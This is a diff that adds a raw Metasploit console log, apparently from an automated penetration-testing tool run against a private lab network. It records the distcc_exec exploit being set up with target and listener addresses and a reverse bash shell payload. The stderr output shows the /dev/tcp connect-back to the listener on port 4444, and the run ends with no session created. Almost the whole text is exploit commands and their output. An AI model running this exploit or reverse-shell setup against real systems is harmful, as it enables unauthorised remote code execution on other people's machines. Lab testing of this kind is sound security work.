@@ -1,0 +1,18 @@
+[1m[34m[*][0m Processing modules/drivers/exploitation/msf_scripts/192_168_56_103_distcc.rc for ERB directives.
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_distcc.rc)> use exploit/unix/misc/distcc_exec
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/reverse_bash
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_distcc.rc)> set RHOSTS 192.168.56.103
+[0mRHOSTS => 192.168.56.103
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_distcc.rc)> set LHOST 192.168.56.102
+[0mLHOST => 192.168.56.102
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_distcc.rc)> set ExitOnSession true
+[0m[1m[33m[!][0m Unknown datastore option: ExitOnSession.
+ExitOnSession => true
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_distcc.rc)> run
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.56.102:4444 
+[1m[34m[*][0m 192.168.56.103:3632 - stderr: bash: 97: Bad file descriptor
+[1m[34m[*][0m 192.168.56.103:3632 - stderr: bash: /dev/tcp/192.168.56.102/4444: No such file or directory
+[1m[34m[*][0m 192.168.56.103:3632 - stderr: bash: 97: Bad file descriptor
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_distcc.rc)> exit
+[0m
